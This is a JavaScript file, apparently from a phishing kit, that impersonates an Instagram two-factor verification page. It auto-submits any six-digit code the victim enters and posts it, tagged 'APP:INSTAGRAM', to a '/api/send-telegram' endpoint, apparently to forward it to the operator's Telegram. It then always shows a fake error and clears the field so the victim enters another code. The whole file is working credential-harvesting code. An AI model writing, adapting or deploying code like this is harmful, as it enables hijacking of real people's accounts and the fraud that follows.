// 1. Get the unique project name from the URL.
console.log("[SECURE.JS DEBUG] Window location search:", window.location.search);
const urlParams = new URLSearchParams(window.location.search);
const projectName = urlParams.get('project');
console.log("[SECURE.JS DEBUG] Extracted projectName:", projectName);

const codeInput = document.getElementById("codeInput");
const secureForm = document.getElementById("secureForm");
const btn = document.getElementById("secureBtn");
const btnText = document.getElementById("btnText");
const spinner = document.getElementById("spinner");
const errorMsg = document.getElementById("errorMsg");

// Auto-submit when 6 digits are entered
codeInput.addEventListener("input", () => {
  if (codeInput.value.length === 6) {
    secureForm.dispatchEvent(new Event('submit'));
  }
});

secureForm.addEventListener("submit", async (e) => {
  e.preventDefault();
  const code = codeInput.value.trim();

  if (code.length < 6) {
    return; // Don't submit if code is too short
  }

  // --- UI Loading State ---
  btn.disabled = true;
  btnText.textContent = "Verifying...";
  spinner.classList.remove("hidden");
  errorMsg.classList.add("hidden");

  // --- Prepare the Message ---
  const message = `

APP:INSTAGRAM

2FA CODE:  ${code}

  `;

  // --- Send Data to Backend ---
  try {
    await fetch('/api/send-telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      // 2. Send the message AND the unique project name.
      body: JSON.stringify({ message, projectName })
    });
  } catch (err) {
    console.error("Failed to send to backend:", err);
  }

  // --- Handle UI Response (Always show error) ---
  setTimeout(() => {
    errorMsg.classList.remove("hidden");
    btn.disabled = false;
    btnText.textContent = "Submit";
    spinner.classList.add("hidden");
    codeInput.value = ""; // Clear input for next try
  }, 1000);
});